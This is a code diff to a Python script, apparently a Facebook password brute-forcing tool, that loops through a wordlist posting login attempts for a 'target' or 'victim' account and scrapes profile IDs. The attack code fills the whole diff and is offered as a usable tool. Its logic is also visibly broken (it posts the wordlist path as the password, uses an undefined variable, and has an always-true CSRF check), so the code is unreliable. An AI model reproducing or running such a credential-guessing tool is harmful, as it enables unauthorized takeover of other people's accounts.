@@ -14,7 +14,7 @@ rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
 yl="\033[1;33m" #>Yellow#
 #########################
-print(Fore.BLUE + '''
+print(wi + Fore.BLUE + '''
 ╔═╗╔╗    ╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗
 ╠╣ ╠╩╗───╠╩╗╠╦╝║ ║ ║ ║╣───╠╣ ║ ║╠╦╝║  ║╣ 
 ╚  ╚═╝   ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝╩╚═╚═╝╚═╝ 
@@ -29,8 +29,8 @@ currentdir = os.getcwd()
 error = requests.get('https://facebook.com/login?')
 time.sleep(0.1)
 print(Fore.GREEN + 'Created By FonderElite || Droid')
-print(Fore.MAGENTA + 'Visit My GitHub Page: https://github.com/FonderElite')
-print(Fore.MAGENTA + 'Visit Our WebSIte: https://singularity.rf.gd')
+print(wi + 'Visit My GitHub Page: https://github.com/FonderElite')
+print(wi + 'Visit Our WebSIte: https://singularity.rf.gd')
 oof = Fore.RED + platform.system()
 time.sleep(2)
 time.sleep(1)
@@ -58,8 +58,8 @@ help = Fore.YELLOW + '''
 +|      -s          Start                  |+
 +|      -u          Update                 |+
 +|      -q          Quit                   |+
-+|Ex. ./fbbruteforce -id -w -s (brute-force)|+       
-+|Ex  ./fbbruteforce -g (Get Profile Id)   |+
++|Ex. ./fb -id -w -s (brute-force)         |+       
++|Ex  ./fb -g (Get Profile Id)             |+
  ==========================================='''
 errMsg = ""
 def infoga():
@@ -72,7 +72,7 @@ def infoga():
             idis = idre.findall(con)
             print(wi + "\n[" + gr + "+" + wi + "]" + gr + " Target Profile" + wi + " ID: " + yl + idis[0] + wi)
         except IndexError:
-            errMsg("Please Check Your Victim's Profile URL")
+            print(wi + rd + "[-]" + wi +"Please Check Your Victim's Profile URL")
             sys.exit(1)
 
 def updatefbbrute():
@@ -115,49 +115,50 @@ print(Fore.GREEN + 'Done!')
 print(help)
 print(wi + gr + "Current Directory: " + wi + currentdir)
 time.sleep(2)
-command = input(Fore.RED +  ">"  + oof + "-User: ")
-if command == "./fbbruteforce -h":
-    print(help)
+while True:
+ command = input(Fore.RED +  ">"  + oof + "-User: " + wi)
+ if command == "./fb -h":
+  print(help)
 
-elif command == "./fbbruteforce -g":
-    infoga()
+ elif command == "./fb -g":
+  infoga()
 
-elif command == "./fbbruteforce -u":
-    updatefbbrute()
+ elif command == "./fb -u":
+  updatefbbrute()
 
-elif command == "./fbbruteforce -id -w -s":
-    id = input("Enter the Target's Id or Email: ")
-    wordlist = input('Input wordlist location: ')
-    read = open(wordlist,'r')
-    payload = {
+ elif command == "./fb -id -w -s":
+  id = input("Enter the Target's Id or Email: ")
+  wordlist = input('Input wordlist location: ')
+  read = open(wordlist,'r')
+  payload = {
         'LogInID':id,
         'Password':wordlist,
          'Log In':'submit'
 
     }
-    for i in read:
-     count = 0
-     i = i.strip()
-     count += 1
-     print(Fore.RED + '[+]' + gr +   wi + gr + "Trying Password: " + i)
-     response = requests.post('https://facebook.com/login?',data=payload)
-     print(wi + Fore.RED + 'Failed.')
-elif error == "400":
- print(Fore.RED + "Error Occured. Status Code 400 encountered")
- print(Fore.MAGENTA + "BruteForce Failed!")
- pass
+  for i in read:
+   count = 0
+   i = i.strip()
+   count += 1
+   print(wi + rd + '[-]' +  wi + gr + "Trying Password: " + i)
+   response = requests.post('https://facebook.com/login?',data=payload)
+   print(wi + rd + 'Failed.')
+ elif error == "400":
+  print(Fore.RED + "Error Occured. Status Code 400 encountered")
+  print(Fore.MAGENTA + "BruteForce Failed!")
+  pass
 
-elif "CSRF" or 'csrf' in str(response.content):
- print(Fore.RED + "CSRF Token Detected! or SPACING!")
- exit()
-elif command == "./fbbruteforce -q":
-    print(Fore.RED + "(っ◔◡◔)っ ♥ Quitting.... ♥")
-    time.sleep(0.2)
-    sys.exit()
-else:
- print("Username: " + id)
- print("Password Found: " + word)
- exit()
+ elif "CSRF" or 'csrf' in str(response.content):
+  print(Fore.RED + "CSRF Token Detected! or SPACING!")
+  exit()
+ elif command == "./fbbruteforce -q":
+  print(Fore.RED + "(っ◔◡◔)っ ♥ Quitting.... ♥")
+  time.sleep(0.2)
+  sys.exit()
+ else:
+  print("Username: " + id)
+  print(wi + gr + "[+]" + wi + "Password Found: " + word)
+  exit()
 #Made By FonderElite
 #---------------------------------|+
 #| Copyright © 2021 Fonder-Elite  |+
